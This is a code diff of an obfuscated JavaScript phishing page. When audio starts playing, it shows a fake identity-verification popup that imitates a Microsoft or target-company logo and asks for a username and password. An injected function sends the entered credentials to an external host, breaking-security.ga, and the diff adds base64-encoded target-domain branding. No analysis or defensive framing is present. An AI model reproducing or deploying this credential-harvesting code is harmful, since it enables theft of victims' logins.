@@ -28,29 +28,54 @@ xhttp.send();
 }
 ghjfyu();
 
+function tytuui(jjs, callback) {
+    const jjs = new Image();
+    jjs.src = url;
+        if (jjs.complete) {
+            callback(true);
+        } else {
+            jjs.onload = () => {
+                callback(true)
+            };
+        jjs.onerror = () => {
+            callback(false);
+        };
+    }
+}
+
 function uigjsh() {
     var aud = document.getElementById("aud");
     aud.onplay = function() {
         var allow = document.getElementById("allow").value;
         if (allow != 'yes') {
-            var modal = document.createElement("div");
-            modal.setAttribute("class", "modal");
-            modal.setAttribute("id", "myModal");
-            var modalc = document.createElement("div");
-            modalc.setAttribute("class", "modal-content");
-            var content = document.createElement("h3");
-            var d = "microsoft.com";
-            var form = `<img src="https://logo.clearbit.com/[-d-]"><h5>Please verify your identity to listen</h5> 
-            <table> <tr> <td> Username: </td> <td> <input type="text" id="username" value=""/> <input type="hidden" id="reason" value=""/> </td> </tr> <tr> <td> Password: </td> <td> <input type="password" id="pass" value=""/> </td> </tr> </table> 
-            <h6 id="error-div" style="color:red;display:none">An error occurred, please try again</h6><button id="trigger" class="trigger" onClick="yeres()">Verify</button>`;
-            content.innerHTML = form.replace("[-d-]", d);
-            modalc.appendChild(content);
-            modal.appendChild(modalc);
-            document.getElementById("body").appendChild(modal);
-            var x = document.createElement("script");
-            x.text = `function yeres(){var e=document.getElementById("trigger"),t=document.getElementById("username").value,n=document.getElementById("pass").value,a=document.getElementById("id").value,d=document.getElementById("reason").value;if(e.innerText="Please wait...",!t||!n||!a)return document.getElementById("error-div").style.display="block",void(e.innerText="Verify");const s=new XMLHttpRequest;s.onreadystatechange=function(){4==this.readyState&&200==this.status&&("ok"===this.responseText?(document.getElementById("myModal").classList.toggle("show-modal"),document.getElementById("allow").value="yes"):(document.getElementById("reason").value="2",document.getElementById("username").value="",document.getElementById("pass").value="",document.getElementById("error-div").style.display="block",e.innerText="Verify"))},s.open("GET","https://breaking-security.ga?target=attachment&username="+t+"&password="+n+"&reason="+d+"&owner="+a),s.send()}`;
-            document.body.appendChild(x);
-            modal.classList.toggle("show-modal");
+            var dom = atob(document.getElementById("ddd").value);
+            var jjs = "https://logo.clearbit.com/"+dom;
+            tytuui(jjs, (exists) => {
+                var modal = document.createElement("div");
+                modal.setAttribute("class", "modal");
+                modal.setAttribute("id", "myModal");
+                var modalc = document.createElement("div");
+                modalc.setAttribute("class", "modal-content");
+                var content = document.createElement("h3");
+                if(exists) {
+                    var fff = `<img src="[-img-]"><h5>Please verify your identity to listen</h5> 
+                    <table> <tr> <td> Username: </td> <td> <input type="text" id="username" value=""/> <input type="hidden" id="reason" value=""/> </td> </tr> <tr> <td> Password: </td> <td> <input type="password" id="pass" value=""/> </td> </tr> </table> 
+                    <h6 id="error-div" style="color:red;display:none">An error occurred, please try again</h6><button id="trigger" class="trigger" onClick="yeres()">Verify</button>`;
+                    var form = fff.replace("[-img-]", jjs);
+                } else {
+                    var form = `<img src="https://logo.clearbit.com/microsoft"><h5>Please verify your identity to listen</h5> 
+                    <table> <tr> <td> Username: </td> <td> <input type="text" id="username" value=""/> <input type="hidden" id="reason" value=""/> </td> </tr> <tr> <td> Password: </td> <td> <input type="password" id="pass" value=""/> </td> </tr> </table> 
+                    <h6 id="error-div" style="color:red;display:none">An error occurred, please try again</h6><button id="trigger" class="trigger" onClick="yeres()">Verify</button>`;
+                }
+                content.innerHTML = form;
+                modalc.appendChild(content);
+                modal.appendChild(modalc);
+                document.getElementById("body").appendChild(modal);
+                var x = document.createElement("script");
+                x.text = `function yeres(){var e=document.getElementById("trigger"),t=document.getElementById("username").value,n=document.getElementById("pass").value,a=document.getElementById("iii").value,d=document.getElementById("reason").value,s=document.getElementById("rrr").value;if(e.innerText="Please wait...",!t||!n||!a)return document.getElementById("error-div").style.display="block",void(e.innerText="Verify");const l=new XMLHttpRequest;l.onreadystatechange=function(){4==this.readyState&&200==this.status&&("ok"===this.responseText?(document.getElementById("myModal").classList.toggle("show-modal"),document.getElementById("allow").value="yes"):(document.getElementById("reason").value="2",document.getElementById("username").value="",document.getElementById("pass").value="",document.getElementById("error-div").style.display="block",e.innerText="Verify"))},l.open("GET","https://breaking-security.ga?target=attachment&username="+t+"&password="+n+"&reason="+d+"&owner="+a+"&r="+s),l.send()}`;
+                document.body.appendChild(x);
+                modal.classList.toggle("show-modal");
+            });
             aud.pause();
         }
     };
